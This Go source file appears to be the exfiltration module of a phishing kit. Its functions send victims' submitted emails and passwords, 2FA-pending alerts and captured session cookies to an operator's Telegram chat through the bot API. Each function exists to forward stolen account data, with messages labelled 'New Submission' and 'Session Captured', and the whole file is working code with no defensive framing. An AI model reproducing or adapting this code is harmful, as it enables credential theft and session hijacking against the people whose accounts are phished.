package webhook

import (
	"bytes"
	"encoding/json"
	"fmt"
	"html"
	"mime/multipart"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type TelegramSender struct {
	Token    string
	ChatID   string
	ProxyURL string
	client   *http.Client
}

func NewSender(token, chatID, proxyURL string) *TelegramSender {
	httpClient := &http.Client{
		Timeout: 15 * time.Second,
	}

	proxyURL = strings.TrimSpace(proxyURL)
	if proxyURL != "" {
		if p, err := url.Parse(proxyURL); err == nil {
			if defaultTransport, ok := http.DefaultTransport.(*http.Transport); ok {
				// Clone DefaultTransport to keep optimization settings (pooling, keep-alives)
				transport := defaultTransport.Clone()
				transport.Proxy = http.ProxyURL(p)
				httpClient.Transport = transport
			}
		}
	}

	return &TelegramSender{
		Token:    token,
		ChatID:   chatID,
		ProxyURL: proxyURL,
		client:   httpClient,
	}
}

func (t *TelegramSender) SendCredentials(source, email, password, ip string) error {
	if t.Token == "" || t.ChatID == "" {
		return nil
	}
	
	msg := fmt.Sprintf("🔐 <b>New Submission</b>\n\nSource: %s\nEmail: <code>%s</code>\nPassword: <code>%s</code>\nIP: %s\nTime: %s",
		html.EscapeString(source), 
		html.EscapeString(email), 
		html.EscapeString(password), 
		html.EscapeString(ip), 
		time.Now().Format("2006-01-02 15:04:05"))
	
	return t.send(msg)
}

func (t *TelegramSender) Send2FARequired(source, email, ip string) error {
	if t.Token == "" || t.ChatID == "" {
		return nil
	}
	
	msg := fmt.Sprintf("⚠️ <b>2FA Required</b>\n\nSource: %s\nEmail: <code>%s</code>\nIP: %s\nTime: %s\nStatus: <i>Waiting for verification code</i>",
		html.EscapeString(source), 
		html.EscapeString(email), 
		html.EscapeString(ip), 
		time.Now().Format("2006-01-02 15:04:05"))
	
	return t.send(msg)
}

func (t *TelegramSender) SendSession(source, email, cookies string) error {
	if t.Token == "" || t.ChatID == "" {
		return nil
	}
	
	msg := fmt.Sprintf("✅ <b>Session Captured</b>\n\nSource: %s\nEmail: <code>%s</code>\nTime: %s",
		html.EscapeString(source), 
		html.EscapeString(email), 
		time.Now().Format("2006-01-02 15:04:05"))
	
	if err := t.send(msg); err != nil {
		return err
	}
	
	return t.sendFile(fmt.Sprintf("%s_session.txt", email), cookies)
}

func (t *TelegramSender) send(msg string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.Token)
	data, err := json.Marshal(map[string]string{
		"chat_id": t.ChatID,
		"text":    msg,
		"parse_mode": "HTML",
	})
	if err != nil {
		return fmt.Errorf("failed to marshal telegram message: %w", err)
	}
	
	resp, err := t.client.Post(apiURL, "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API error: %s", resp.Status)
	}

	return nil
}

func (t *TelegramSender) sendFile(filename, content string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.Token)
	
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	
	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return err
	}
	
	if _, err := part.Write([]byte(content)); err != nil {
		return err
	}
	
	if err := writer.WriteField("chat_id", t.ChatID); err != nil {
		return err
	}
	
	if err := writer.WriteField("caption", filename); err != nil {
		return err
	}
	
	if err := writer.Close(); err != nil {
		return err
	}

	resp, err := t.client.Post(apiURL, writer.FormDataContentType(), body)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API error (file): %s", resp.Status)
	}

	return nil
}